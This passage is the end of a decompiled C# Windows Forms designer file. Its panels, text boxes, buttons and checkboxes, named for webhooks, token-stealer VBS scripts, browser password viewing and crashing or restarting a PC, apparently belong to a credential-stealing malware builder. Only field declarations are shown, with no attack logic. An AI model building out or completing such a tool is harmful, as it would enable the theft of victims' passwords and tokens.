        private global::System.Windows.Forms.Panel panel27;

        // Token: 0x0400001A RID: 26
        private global::System.Windows.Forms.Panel panel36;

        // Token: 0x0400001B RID: 27
        private global::System.Windows.Forms.Panel panel37;

        // Token: 0x0400001C RID: 28
        private global::System.Windows.Forms.Panel WebhookPnl;

        // Token: 0x0400001D RID: 29
        private global::System.Windows.Forms.TextBox WebHookTxt;

        // Token: 0x0400001E RID: 30
        private global::RoundBtn CreateSendhookfileBtn;

        // Token: 0x0400001F RID: 31
        private global::System.Windows.Forms.NotifyIcon WinInfo;
        private System.Windows.Forms.Panel FinalresbatPnl;
        private System.Windows.Forms.TextBox FinalresbatTxt;
        private System.Windows.Forms.Panel TokenStealer2VbsPnl;
        private System.Windows.Forms.TextBox TokenStealer2VbsTxt;
        private System.Windows.Forms.Panel TokenStealerVbsPnl;
        private System.Windows.Forms.TextBox TokenStealerVbsTxt;
        private System.Windows.Forms.Panel WebbrowserpassviewPnl;
        private System.Windows.Forms.TextBox WebbrowserpassviewTxt;
        private System.Windows.Forms.Panel SendhookfilePnl;
        private System.Windows.Forms.TextBox SendhookfileTxt;
        private RoundBtn CreateTokenStealerBtn;
        private System.Windows.Forms.CheckBox CrashPCchkbox;
        private System.Windows.Forms.Panel panel1;
        private RoundBtn roundBtn1;
        private System.Windows.Forms.CheckBox RestartPCchkbox;
    }
}
